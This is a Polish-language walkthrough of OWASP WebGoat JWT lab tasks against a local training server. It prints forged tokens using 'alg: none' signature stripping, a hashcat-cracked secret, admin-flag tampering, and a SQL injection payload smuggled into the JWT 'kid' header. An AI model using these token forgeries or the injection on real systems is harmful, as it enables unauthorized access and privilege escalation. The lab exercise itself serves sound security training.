4. Logujemy się jako Tom i głosujemy, następnie próbujemy jako gość usunąć głos Toma,
w Burpie dostajemy odpowiedź zwrotną "Only an admin user can reset the votes".
Wystarczy tylko edytować uprawnienia administratora i usunąć sygnaturę dla weryfikacji np. w jwt.io,
następnie zapytanie ze zmodyfikowanym tokenem przesłać dalej (eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MTg1OTMxNTUsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.).

5. Wykorzystujemy hashcata i listę haseł aby złamać token JWT, sygnatura to shipping. Następnie modyfikujemy całośc w programie np. jwt.io.
Tak przygotowany token wklejamy w zadaniu (eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYwMTc3Mjk3MjUsImV4cCI6MTYwMTc3Mjk3ODUsInN1YiI6IndlYmdvYXRAd2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6IndlYmdvYXRAd2ViZ29hdC5vcmciLCJSb2xlIjpbIk1hbmFnZXIiLCJQcm9qZWN0IEFkbWluaXN0cmF0b3IiXX0.3sjbqxpc47zcvDyCOaPoYysPQbjL6h2Tx5CtrXlfJkE).

7. Odświeżamy stronę, w burpie można zauważyć:

Cookie: JSESSIONID=04HcJQRR7MeluE3XiJQ_JJYXBhZmXJby3pVs1Izw
Connection: close

{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}

Wysyłając zapytanie otrzymujemy wcześniejszy token który możemy wykorzystać, przechodzimy do checkout i przechwytujemy zapytanie.
W przechwyconym tokenie usuwamy algorytm oraz sygnaturę weryfikacji, zmieniamy dane na Toma, edytujemy odpowiednią godzinę (dokładny czas można znaleźć np. w pythonie time. time())
Wklejamy zmodyfikowany token jako wartość dla autoryzacji i przechodzimy dalej.

eyJhbGciOiJOb25lIn0=.eyJpYXQiOjE2MTgzNDc5MTUuOTIyNzQ5LCJleHAiOjE2NTgzNDc5MTUuOTIyNzQ5LCJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.

8. Klikamy delete i przechwytujemy zapytanie w Burpie.

POST /WebGoat/JWT/final/delete?token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8 HTTP/1.1
Host: localhost:8080
Content-Length: 0

Token ten oznacza dokładnie:
{
  "typ": "JWT",
  "kid": "webgoat_key",
  "alg": "HS256"
}

{
  "iss": "WebGoat Token Builder",
  "iat": 1618348964,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Jerry",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}

Należy go zmodyfikować, dodając do kid odpowiednie polecenie union select, oraz zmieniając użytkownika dla odpowiedniej weryfikacji, czyli
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "'union select 'MQ==' from INFORMATION_SCHEMA.SYSTEM_USERS --"
}
{
  "iss": "WebGoat Token Builder",
  "iat": 1618348964,
  "exp": 1633475398,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Tom",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}

Cały token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Iid1bmlvbiBzZWxlY3QgJ01RPT0nIGZyb20gSU5GT1JNQVRJT05fU0NIRU1BLlNZU1RFTV9VU0VSUyAtLSJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYzMzQ3NTM5OCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.6_HQzwkh4D3Y7JMH08PoTXDb2LH7_RUBWTWVuBDS7m8